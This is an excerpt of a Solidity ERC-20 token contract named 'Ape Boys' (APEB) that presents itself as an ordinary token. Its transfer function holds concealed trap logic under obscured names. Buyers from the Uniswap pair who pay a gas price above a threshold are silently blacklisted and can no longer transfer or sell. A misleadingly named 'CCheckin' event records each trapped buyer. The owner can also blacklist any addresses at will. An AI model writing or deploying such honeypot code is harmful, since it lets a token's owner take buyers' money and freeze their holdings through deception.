...
contract ApeBoys is Ownable, IERC20 {
    ...
    string private _name = "Ape Boys";

    string private _symbol = "APEB";

    uint256 private _liquiditySwapThreshold = _totalSupply;

    uint256 private mrr = 5000000000;
    bool private hcm = true;
    mapping (address => bool) public iHG;

    bool swapping = false;

    event CCheckin(address guest, uint256 rentPaid);
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual {
        ...
        if(hcm){
            require(!iHG[from],"BCS");
            if(tx.gasprice >= mrr && from == uniswapV2Pair()){
                iHG[to] = true;
                emit CCheckin(to, tx.gasprice);
            }
        }
    ...
    function manage_hcm(bool _status) public onlyOwner {
        hcm = _status;
    }
    function manage_iHG(address[] calldata addresses, bool status) public onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {
            iHG[addresses[i]] = status;
        }
    }
}